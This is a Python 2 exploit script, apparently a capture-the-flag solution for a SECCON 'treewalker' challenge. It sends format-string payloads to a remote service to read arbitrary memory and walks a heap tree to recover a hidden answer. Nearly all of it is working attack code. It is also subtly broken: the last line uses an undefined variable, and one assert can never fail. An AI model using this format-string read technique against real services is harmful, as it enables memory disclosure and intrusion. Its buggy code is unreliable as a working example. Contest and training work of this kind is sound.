#!/usr/bin/env python2
from socket import *
import struct

HOST = 'localhost'
HOST = 'treewalker.pwn.seccon.jp'

def p64(n):
    return struct.pack('<Q', n)

def up64(s):
    assert(len(s) <= 8)
    return struct.unpack('<Q', s.ljust(8, "\x00"))[0]

def reqs(msg, length = None):
    req(msg, length)
    return req("\n", read = True)

def req(msg, length = None, read = False):
    if not length:
        length = len(msg)
    else:
        assert(length >= len(msg) + 1)
    s.send(p64(length + 1))
    s.send(msg + "\x00")
    if read:
        return f.readline()
    else:
        return None

def r(addr):
    payload = "%17llx" * 114
    payload += "%s"
    payload = payload.ljust(8 * 100, "A")
    payload += p64(addr)

    res = reqs(payload)
    idx = res.index("A" * 16)
    return res[1938:idx]

if __name__ == '__main__':
    s = socket(AF_INET, SOCK_STREAM)

    s.connect((HOST, 20000))
    raw_input("Press enter\n")
    f = s.makefile()
    heap = int(f.readline(),16)
    print("HEAP : %016X" % heap)
    bits = ""
    while True:
        ty = r(heap)
        left = r(heap + 8)
        right = r(heap + 16)
        print("BITS : %s" % bits)
        print(repr(ty), repr(left), repr(right))
        if (ty == 'L'):
            break
        if (left == ''):
            bits += "0"
            heap = up64(right)
        elif (right == ''):
            bits += "1"
            heap = up64(left)
        else:
            assert("Cannot find..")

    print("ANSWER : %s" % \
            ''.join(map(lambda bits:chr(int(bits,2)), [bits[i:i+8] for i in range(0, len(x), 8)])))
